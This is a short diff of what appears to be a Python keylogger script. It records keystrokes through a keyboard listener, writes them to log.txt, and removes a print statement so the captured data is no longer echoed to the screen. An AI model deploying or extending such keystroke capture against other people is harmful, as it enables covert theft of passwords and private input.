@@ -46,7 +46,6 @@ with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
 loged_data="".join(keys)
-print(loged_data)
 with open('log.txt','a') as log_file:
     log_file.write(loged_data)
     log_file.close()
